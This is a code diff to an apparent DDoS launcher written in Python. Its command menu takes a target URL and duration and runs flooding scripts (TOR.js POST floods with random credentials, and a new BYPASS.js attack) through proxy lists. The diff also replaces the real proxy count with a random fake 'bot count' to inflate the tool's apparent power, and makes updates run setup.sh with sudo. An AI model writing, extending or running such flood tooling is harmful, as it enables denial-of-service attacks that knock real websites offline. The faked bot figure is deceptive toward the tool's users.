@@ -17,19 +17,6 @@ def pro(cr, tl, br_ln=30):
 def clr_csl():
     o.system("cls" if o.name == "nt" else "clear")
 
-
-def load_prxs(file_path="bin/odd/.cache/proxy.txt"):
-    try:
-        with open(file_path, "r") as file:
-            for line in file:
-                proxy = line.strip()
-                if proxy:
-                    yield proxy
-    except FileNotFoundError:
-        o.system("touch bin/odd/.cache/proxy.txt &")
-        s.exit(1)
-
-
 def dis_ds():
     up_tm = int(t.time() - ses_srt)
     minutes, seconds = divmod(up_tm, 60)
@@ -166,7 +153,7 @@ def mn_lp():
                 ani_txt("👋 Goodbye, have a great day.", 0.02)
                 break
 
-            elif cmd in ["TOR", "FLOOD"]:
+            elif cmd in ["TOR", "BYPASS"]:
                 try:
                     tg = parts[1]
                     mx_tm = int(parts[2])
@@ -181,13 +168,13 @@ def mn_lp():
                             rn_cmd(
                                 f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                             )
-                        elif cmd == "FLOOD":
+                        elif cmd == "BYPASS":
                             rn_cmd(
-                                f"go run bin/odd/.cache/TorXHulk.go --site {tg} --data GET"
+                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 bin/odd/.cache/proxy.txt"
                             )
                             rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
                             rn_cmd(
-                                f"go run bin/odd/.cache/TorXCrash.go {tg} 9999 GET {mx_tm} nil"
+                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 bin/odd/.cache/proxy.txt"
                             )
                         t.sleep(1)
                 except IndexError:
@@ -251,10 +238,11 @@ def mn_lp():
                 continue
 
             elif cmd == "PROXY":
-                rn_cmd("python3 bin/odd/.cache/scrape.py &")
+                rn_cmd("python3 root/scrape.py &")
                 continue
             elif cmd == "UPDATE":
                 rn_cmd("git reset --hard HEAD && git pull origin main")
+                rn_cmd("sudo bash setup.sh &")
                 continue
             elif cmd == "SETUP":
                 rn_cmd("sudo bash setup.sh &")
@@ -278,5 +266,5 @@ def mn_lp():
 
 
 ses_srt = t.time()
-bot_cnt = sum(1 for _ in load_prxs())
+bot_cnt = r.randint(10000, 1000000)
 mn_lp()
